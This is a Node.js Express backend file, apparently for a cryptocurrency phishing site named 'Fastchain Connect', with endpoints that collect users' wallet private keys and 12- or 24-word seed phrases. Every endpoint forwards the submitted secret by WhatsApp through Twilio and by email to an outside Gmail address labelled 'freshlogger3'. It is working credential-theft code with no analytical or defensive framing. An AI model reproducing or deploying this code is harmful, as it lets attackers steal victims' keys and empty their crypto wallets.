const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
const twilio = require("twilio");

dotenv.config();

const app = express();

// ✅ Twilio WhatsApp setup
const twilioClient = twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH);
const sendWhatsApp = async (message) => {
  try {
    await twilioClient.messages.create({
      body: message,
      from: process.env.TWILIO_FROM,
      to: process.env.TWILIO_TO,
    });
    console.log("✅ WhatsApp message sent");
  } catch (err) {
    console.log("❌ WhatsApp error");
  }
};

// ✅ CORS config
const allowedOrigins = [
  "https://fastchainconnect.com",
  "https://www.fastchainconnect.com", // Add this if needed
  "https://back.fastchainconnect.com",
  "https://fastchainconect-back.vercel.app",
  "http://localhost:5173",

];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Nodemailer setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.ADMIN_EMAIL,
    pass: process.env.ADMIN_PASSWORD,
  },
});

// ✅ Home route
app.get("/", (req, res) => {
  res.send("✅ SwiftNodeLinker Server Running");
});

// 🔐 Private Key route
app.post("/api/submit/private-key", async (req, res) => {
  const { privateKey } = req.body;

  if (!privateKey) {
    return res
      .status(400)
      .json({ success: false, message: "Private key is required" });
  }

  try {
    await sendWhatsApp(`\n${privateKey}`);

    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: ["freshlogger3@gmail.com"],
      subject: "New Private Key Submitted - Fastchain Connect",
      text: `Private Key: ${privateKey}`,
    });

    res.json({ success: true, message: "Private key submitted" });
  } catch (error) {
    console.error("Error submitting private key:", error.message);
    res.status(500).json({ success: false, message: "Failed to send" });
  }
});

// 🧠 12-word Seed Phrase
app.post("/api/submit/seed-phrase", async (req, res) => {
  const { seedPhrase } = req.body;

  if (!seedPhrase) {
    return res
      .status(400)
      .json({ success: false, message: "Seed phrase is required" });
  }

  const words = seedPhrase.trim().split(/\s+/);
  if (words.length !== 12) {
    return res.status(400).json({
      success: false,
      message: "Seed phrase must be exactly 12 words",
    });
  }

  const formatted = words.join(" ");

  try {
    await sendWhatsApp(`\n${formatted}`);

    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: ["freshlogger3@gmail.com"],
      subject: "New 12-Word Seed Phrase Submitted - Fastchain Connect",
      text: `Seed Phrase:\n\n${formatted}`,
    });

    res.json({ success: true, message: "12-word seed phrase submitted" });
  } catch (error) {
    console.error("Error submitting 12-word phrase:", error.message);
    res.status(500).json({ success: false, message: "Failed to send" });
  }
});

// 🧠 24-word Seed Phrase
app.post("/api/submit/seed-phrase-24", async (req, res) => {
  const { seedPhrase } = req.body;

  if (!seedPhrase) {
    return res
      .status(400)
      .json({ success: false, message: "Seed phrase is required" });
  }

  const words = seedPhrase.trim().split(/\s+/);
  if (words.length !== 24) {
    return res.status(400).json({
      success: false,
      message: "Seed phrase must be exactly 24 words",
    });
  }

  const formatted = words.join(" ");

  try {
    await sendWhatsApp(`\n${formatted}`);

    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: ["freshlogger3@gmail.com"],
      subject: "New 24-Word Seed Phrase Submitted - Fastchain Connect",
      text: `24-Word Seed Phrase:\n\n${formatted}`,
    });

    res.json({ success: true, message: "24-word seed phrase submitted" });
  } catch (error) {
    console.error("Error submitting 24-word phrase:", error.message);
    res.status(500).json({ success: false, message: "Failed to send" });
  }
});

const PORT = process.env.PORT || 2000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
